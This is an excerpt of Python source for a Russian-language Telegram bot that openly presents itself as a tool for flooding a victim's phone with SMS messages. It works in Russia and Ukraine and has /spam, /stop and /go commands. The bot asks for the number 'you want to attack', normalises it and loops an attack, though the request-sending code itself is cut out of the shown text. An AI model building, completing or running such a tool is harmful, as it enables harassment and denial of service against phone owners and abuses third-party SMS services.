...
import requests, datetime, sys, time, argparse, os

# defoult start number
START_NUMBER = '89'
START_NUMBER_2 = '+7'
START_NUMBER_3 = '+3'
...
keyboard.row('/spam', '/Admin', '/commands')
keyboard1 = telebot.types.ReplyKeyboardMarkup(True)
keyboard1.row('/stop', '/go')

# start
@bot.message_handler(commands=['start'])
def welcome(message):
    bot.send_photo(message.chat.id, 'AgACAgIAAxkBAAIDE17UI8NYSYHKi2LGVuHhH8BoD_FGAAI1rTEb6x2gSlZMGnnMiIvmNvnXky4AAwEAAwIAA20AA3cNAQABGQQ')
    bot.send_message(message.chat.id, 'Привет! @{0.username},\nЯ - {1.first_name}, бот созданный для флуда смс на телефон!\nЯ могу работать как в России, так и в Украине.'.format(message.from_user, bot.get_me(), parse_mode='html'), reply_markup=keyboard)

# oll commands
@bot.message_handler(commands=['commands'])
def commands(message):
    bot.send_message(message.chat.id, 'Список всех команд:\n/start - Начальная команда запусающая бота\n/Admin - Админ и Разработчик проекта\n/spam - Команда включающая 1 круг спама\n/commands - Список всех команд\n/stop - Команда останавливающая спам после 1 круга\n/go - Команда продолжающая спам поле 1 круга.')

# help
@bot.message_handler(commands=['Admin'])
def admin(message):
    bot.send_message(message.chat.id, 'Разработчик и Админ - @Pressf1om,\nвсе вопросы лс.')

# main start loop
@bot.message_handler(commands=['spam'])
def spam(message):
    bot.send_message(message.chat.id, 'Введите номер который хотите атаковать: ')
...
def go(message):
    if 1 == 1:
        _phone = message.text
        bot.send_message(message.chat.id, 'Атака на номер продолжена!')
        if _phone[0] == '+':
            _phone = _phone[1:]
        if _phone[0] == '8':
            _phone = '7'+_phone[1:]
...
def send_message(message):
    if START_NUMBER or START_NUMBER_2 or START_NUMBER_3 in message.text.lower():
        _phone = message.text
        bot.send_message(message.chat.id, 'Номер успешно получен!\nАтака на номер ' + _phone + ' началась!')
        if _phone[0] == '+':
            _phone = _phone[1:]
        if _phone[0] == '8':
            _phone = '7'+_phone[1:]
        ...
        while iteration != 1:
            ...
            bot.send_message(message.chat.id, 'Если вы хотите остановить атаку нажмите /stop.\nЕсли вы хотите продолжить атаку нажмите /go.', reply_markup=keyboard1)
